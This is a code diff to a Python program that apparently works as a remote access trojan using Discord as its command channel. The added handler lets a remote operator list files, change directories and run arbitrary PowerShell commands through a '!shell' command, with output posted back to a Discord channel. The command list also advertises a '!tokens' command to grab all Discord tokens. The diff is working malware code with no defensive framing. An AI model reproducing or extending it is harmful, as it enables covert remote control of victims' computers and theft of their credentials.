@@ -1,4 +1,4 @@
-import os, websocket, asyncio, requests, json
+import os, websocket, asyncio, requests, json, subprocess
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -23,8 +23,98 @@ COMMANDS = [
     "!tokens - Get all discord tokens"
 ]
 
-async def on_message(ws, message):
-    print(message)
+async def on_message(command, channel_id, session):
+    if command.lower() == "!help":
+        session.post(f"{API_URL}/channels/{channel_id}/messages", json={
+            "embeds": [{
+                "title": "Help",
+                "description": "```{}```".format(
+                    "\n".join(COMMANDS)
+                ),
+                "color": 0xfafafa
+            }]
+        })
+    elif command.lower() == "!ping":
+        session.post(f"{API_URL}/channels/{channel_id}/messages", json={
+            "content": "Session is alive"
+        })
+    elif "!cd" in command.lower():
+        arg = command[4:]
+        if arg:
+            try:
+                os.chdir(arg)
+                session.post(f"{API_URL}/channels/{channel_id}/messages", json={
+                    "embeds": [{
+                        "title": "Changed directory",
+                        "description": "```{}```".format(
+                            os.getcwd()
+                        ),
+                        "color": 0xfafafa
+                    }]
+                })
+            except:
+                session.post(f"{API_URL}/channels/{channel_id}/messages", json={
+                    "embeds": [{
+                        "title": "Error",
+                        "description": "```{}```".format(
+                            "Invalid directory"
+                        ),
+                        "color": 0xfafafa
+                    }]
+                })
+        else:
+            session.post(f"{API_URL}/channels/{channel_id}/messages", json={
+                "embeds": [{
+                    "title": "Error",
+                    "description": "```{}```".format(
+                        "No argument specified"
+                    ),
+                    "color": 0xfafafa
+                }]
+            })
+    elif command.lower() == "!ls":
+        session.post(f"{API_URL}/channels/{channel_id}/messages", json={
+            "embeds": [{
+                "title": "Files",
+                "description": "```{}```".format(
+                    "\n".join(os.listdir())
+                ),
+                "color": 0xfafafa
+            }]
+        })
+    elif "!shell" in command.lower():
+        arg = command[7:]
+        if arg:
+            try:
+                session.post(f"{API_URL}/channels/{channel_id}/messages", json={
+                    "embeds": [{
+                        "title": "Shell",
+                        "description": "```{}```".format(
+                            subprocess.Popen(["powershell", arg], stdout=subprocess.PIPE).communicate()[0].decode("utf-8")
+                        ),
+                        "color": 0xfafafa
+                    }]
+                })
+            except:
+                session.post(f"{API_URL}/channels/{channel_id}/messages", json={
+                    "embeds": [{
+                        "title": "Error",
+                        "description": "```{}```".format(
+                            "Invalid command"
+                        ),
+                        "color": 0xfafafa
+                    }]
+                })
+        else:
+            session.post(f"{API_URL}/channels/{channel_id}/messages", json={
+                "embeds": [{
+                    "title": "Error",
+                    "description": "```{}```".format(
+                        "No argument specified"
+                    ),
+                    "color": 0xfafafa
+                }]
+            })
 
 async def send_heartbeat(ws, interval):
     while True:
@@ -77,18 +167,32 @@ async def main():
         "name": SESSION_ID,
         "type": 0
     }).json()["id"]
-    await send_message(session, channel_id)
+    asyncio.create_task(
+        send_message(session, channel_id)
+    )
     ws = websocket.create_connection(f"{WS_URL}/?v=6&encoding=json")
+    asyncio.create_task(
+        send_heartbeat(ws, json.loads(ws.recv())["d"]["heartbeat_interval"] / 1000)
+    )
     ws.send(json.dumps({
         "op": 2,
         "d": {
             "token": TOKEN,
+            "intents": 3276792,
             "properties": {
                 "$os": "linux",
                 "$browser": "python",
-                "$device": SESSION_ID
+                "$device": SESSION_ID,
             }
         }
     }))
+    while True:
+        data = json.loads(ws.recv())
+        if data["t"] == "MESSAGE_CREATE":
+            if data["d"]["channel_id"] == channel_id:
+                asyncio.create_task(
+                    on_message(data["d"]["content"], channel_id, session)
+                )
+        await asyncio.sleep(0.1)
 
 asyncio.run(main())
